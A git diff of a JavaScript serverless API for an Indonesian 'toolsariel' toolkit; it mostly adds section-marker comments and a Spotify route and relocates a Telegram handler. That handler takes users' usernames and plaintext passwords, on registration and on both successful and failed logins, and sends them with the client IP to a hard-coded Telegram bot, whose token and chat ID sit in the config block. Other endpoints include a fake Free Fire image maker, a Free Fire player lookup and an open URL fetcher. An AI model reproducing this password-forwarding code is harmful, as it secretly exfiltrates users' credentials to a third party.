@@ -1,6 +1,8 @@
 import { kv } from '@vercel/kv';
 
-// ============ KONFIG ============
+// ============================================================
+// ===== [MARKER-KONFIG] KONFIGURASI GLOBAL - GANTI DI SINI =====
+// ============================================================
 const ANITA_API = 'https://anita-studio.netlify.app/.netlify/functions/amprem';
 const TELEGRAM_TOKEN = '8401137297:AAHWeV0-LKRe67cWsAi_jnTFC5xesH5jSTQ';
 const TELEGRAM_CHAT_ID = '6483043491';
@@ -13,8 +15,12 @@ const DEFAULT_USERS = {
     registeredAt: '2026-01-01T00:00:00.000Z'
   }
 };
+// ===== [MARKER-KONFIG-END] =====
 
-// ============ HELPER ============
+
+// ============================================================
+// ===== [MARKER-HELPER] FUNGSI BANTUAN =====
+// ============================================================
 function setCors(res, methods) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', methods || 'GET, POST, OPTIONS');
@@ -27,8 +33,12 @@ function escapeHtml(str) {
     .replace(/</g, '&lt;')
     .replace(/>/g, '&gt;');
 }
+// ===== [MARKER-HELPER-END] =====
 
-// ============ AUTH ============
+
+// ============================================================
+// ===== [MARKER-AUTH] AUTH - LOGIN / REGISTER / LOGOUT / USERS =====
+// ============================================================
 async function handleAuth(req, res, sub) {
   if (sub === 'login') {
     if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });
@@ -150,8 +160,12 @@ async function handleAuth(req, res, sub) {
 
   return res.status(404).json({ success: false, message: 'Sub-action auth tidak ditemukan' });
 }
+// ===== [MARKER-AUTH-END] =====
 
-// ============ AI ARIEL ============
+
+// ============================================================
+// ===== [MARKER-AI] AI ARIEL =====
+// ============================================================
 async function handleAI(req, res) {
   const { prompt } = req.query;
   if (!prompt) {
@@ -208,8 +222,12 @@ async function handleAI(req, res) {
   const data = await response.json();
   return res.status(response.status).json(data);
 }
+// ===== [MARKER-AI-END] =====
 
-// ============ AMPREM ============
+
+// ============================================================
+// ===== [MARKER-AMPREM] ALIGHT MOTION PREMIUM =====
+// ============================================================
 async function callAnita(action, data) {
   const r = await fetch(ANITA_API, {
     method: 'POST',
@@ -301,8 +319,12 @@ async function handleAmpren(req, res, sub) {
 
   return res.status(404).json({ sukses: false, pesan: 'Sub-action amprem tidak ditemukan' });
 }
+// ===== [MARKER-AMPREM-END] =====
 
-// ============ BRAT ============
+
+// ============================================================
+// ===== [MARKER-BRAT] BRAT MAKER =====
+// ============================================================
 async function handleBrat(req, res) {
   const text = req.query.text;
   if (!text) return res.status(400).json({ success: false, message: 'Parameter text wajib diisi' });
@@ -334,8 +356,12 @@ async function handleBrat(req, res) {
     return res.status(200).json({ success: false, message: 'Response tidak dikenali', raw: textResp.substring(0, 300) });
   }
 }
+// ===== [MARKER-BRAT-END] =====
 
-// ============ DARK SYSTEM ============
+
+// ============================================================
+// ===== [MARKER-DARKSYSTEM] DARK SYSTEM MAKER =====
+// ============================================================
 async function handleDarkSystem(req, res) {
   const { name } = req.query;
   if (!name) return res.status(400).json({ success: false, message: 'Parameter name wajib diisi' });
@@ -371,8 +397,12 @@ async function handleDarkSystem(req, res) {
     });
   }
 }
+// ===== [MARKER-DARKSYSTEM-END] =====
 
-// ============ FAKE FF ============
+
+// ============================================================
+// ===== [MARKER-FAKEFF] FAKE FF MAKER =====
+// ============================================================
 async function handleFakeff(req, res) {
   const { username } = req.query;
   if (!username) return res.status(400).json({ success: false, message: 'Parameter username wajib diisi' });
@@ -404,8 +434,12 @@ async function handleFakeff(req, res) {
     image: '/api/tools?action=img&url=' + encodeURIComponent(imageUrl)
   });
 }
+// ===== [MARKER-FAKEFF-END] =====
 
-// ============ FETCH (VIEW SOURCE) ============
+
+// ============================================================
+// ===== [MARKER-FETCH] VIEW SOURCE FETCHER =====
+// ============================================================
 async function handleFetch(req, res) {
   const url = req.query.url;
   if (!url) return res.status(400).json({ success: false, message: 'Parameter url wajib diisi' });
@@ -443,8 +477,12 @@ async function handleFetch(req, res) {
   const html = await response.text();
   return res.json({ success: true, url: response.url, html: html });
 }
+// ===== [MARKER-FETCH-END] =====
 
-// ============ FF STALK ============
+
+// ============================================================
+// ===== [MARKER-FFSTALK] FREE FIRE STALKER =====
+// ============================================================
 async function handleFFStalk(req, res) {
   const userId = req.query.userId || req.query.uid;
   if (!userId) return res.status(400).json({ success: false, message: 'Parameter userId wajib diisi' });
@@ -473,8 +511,12 @@ async function handleFFStalk(req, res) {
 
   return res.status(200).json(data);
 }
+// ===== [MARKER-FFSTALK-END] =====
 
-// ============ IMG PROXY ============
+
+// ============================================================
+// ===== [MARKER-IMG] IMAGE PROXY =====
+// ============================================================
 async function handleImg(req, res) {
   const { url } = req.query;
   if (!url) return res.status(400).json({ success: false, message: 'Parameter url wajib diisi' });
@@ -505,57 +547,12 @@ async function handleImg(req, res) {
   res.setHeader('Cache-Control', 'public, max-age=3600');
   return res.status(200).send(Buffer.from(buffer));
 }
+// ===== [MARKER-IMG-END] =====
 
-// ============ TELEGRAM ============
-async function handleTelegram(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ success: false, message: 'Method not allowed' });
-  }
 
-  const { username, password, tipe } = req.body || {};
-
-  if (!username || !password) {
-    return res.status(400).json({ success: false, message: 'Username dan password wajib diisi' });
-  }
-
-  const ip = req.headers['x-forwarded-for'] || '-';
-  const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
-
-  let header = '';
-  if (tipe === 'register') {
-    header = '<b>REGISTRASI BARU - TOOLSARIEL</b>';
-  } else if (tipe === 'login_gagal') {
-    header = '<b>LOGIN GAGAL - TOOLSARIEL</b>';
-  } else {
-    header = '<b>LOGIN BARU - TOOLSARIEL</b>';
-  }
-
-  const text = header + '\n' +
-    '━━━━━━━━━━━━━━━━━━━━\n' +
-    '<b>Username:</b> <code>' + escapeHtml(String(username).trim()) + '</code>\n' +
-    '<b>Password:</b> <code>' + escapeHtml(String(password)) + '</code>\n' +
-    '━━━━━━━━━━━━━━━━━━━━\n' +
-    '<b>IP:</b> <code>' + escapeHtml(String(ip)) + '</code>\n' +
-    '<b>Waktu:</b> ' + time;
-
-  try {
-    const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: text,
-        parse_mode: 'HTML'
-      })
-    });
-    return res.json({ success: true, message: 'Berhasil' });
-  } catch (err) {
-    return res.status(500).json({ success: false, message: 'Error: ' + err.message });
-  }
-}
-
-// ============ SPOTIFY ============
+// ============================================================
+// ===== [MARKER-SPOTIFY] SPOTIFY DOWNLOADER - BARU =====
+// ============================================================
 async function handleSpotify(req, res) {
   const { url, server } = req.query;
   if (!url) return res.status(400).json({ success: false, message: 'Parameter url wajib diisi' });
@@ -655,8 +652,65 @@ async function handleSpotify(req, res) {
 
   return res.status(200).json({ success: true, result: normalized });
 }
+// ===== [MARKER-SPOTIFY-END] =====
 
-// ============ TIKTOK ============
+
+// ============================================================
+// ===== [MARKER-TELEGRAM] TELEGRAM NOTIFIKASI =====
+// ============================================================
+async function handleTelegram(req, res) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ success: false, message: 'Method not allowed' });
+  }
+
+  const { username, password, tipe } = req.body || {};
+
+  if (!username || !password) {
+    return res.status(400).json({ success: false, message: 'Username dan password wajib diisi' });
+  }
+
+  const ip = req.headers['x-forwarded-for'] || '-';
+  const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+  let header = '';
+  if (tipe === 'register') {
+    header = '<b>REGISTRASI BARU - TOOLSARIEL</b>';
+  } else if (tipe === 'login_gagal') {
+    header = '<b>LOGIN GAGAL - TOOLSARIEL</b>';
+  } else {
+    header = '<b>LOGIN BARU - TOOLSARIEL</b>';
+  }
+
+  const text = header + '\n' +
+    '━━━━━━━━━━━━━━━━━━━━\n' +
+    '<b>Username:</b> <code>' + escapeHtml(String(username).trim()) + '</code>\n' +
+    '<b>Password:</b> <code>' + escapeHtml(String(password)) + '</code>\n' +
+    '━━━━━━━━━━━━━━━━━━━━\n' +
+    '<b>IP:</b> <code>' + escapeHtml(String(ip)) + '</code>\n' +
+    '<b>Waktu:</b> ' + time;
+
+  try {
+    const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: 'HTML'
+      })
+    });
+    return res.json({ success: true, message: 'Berhasil' });
+  } catch (err) {
+    return res.status(500).json({ success: false, message: 'Error: ' + err.message });
+  }
+}
+// ===== [MARKER-TELEGRAM-END] =====
+
+
+// ============================================================
+// ===== [MARKER-TIKTOK] TIKTOK DOWNLOADER =====
+// ============================================================
 async function handleTiktok(req, res) {
   const { url, server } = req.query;
   if (!url) return res.status(400).json({ success: false, message: 'Parameter url wajib diisi' });
@@ -688,8 +742,12 @@ async function handleTiktok(req, res) {
   const data = await response.json();
   return res.json(data);
 }
+// ===== [MARKER-TIKTOK-END] =====
 
-// ============ HANDLER UTAMA ============
+
+// ============================================================
+// ===== [MARKER-HANDLER] HANDLER UTAMA - ROUTING =====
+// ============================================================
 export default async function handler(req, res) {
   setCors(res);
 
@@ -734,6 +792,10 @@ export default async function handler(req, res) {
     // IMG PROXY
     if (action === 'img') return await handleImg(req, res);
 
+    // ===== [SPOTIFY-ROUTE] SPOTIFY ROUTING =====
+    if (action === 'spotify') return await handleSpotify(req, res);
+    // ===== [SPOTIFY-ROUTE-END] =====
+
     // TIKTOK
     if (action === 'tiktok') return await handleTiktok(req, res);
 
@@ -747,3 +809,4 @@ export default async function handler(req, res) {
     return res.status(500).json({ success: false, message: 'Server error: ' + error.message });
   }
 }
+// ===== [MARKER-HANDLER-END] =====
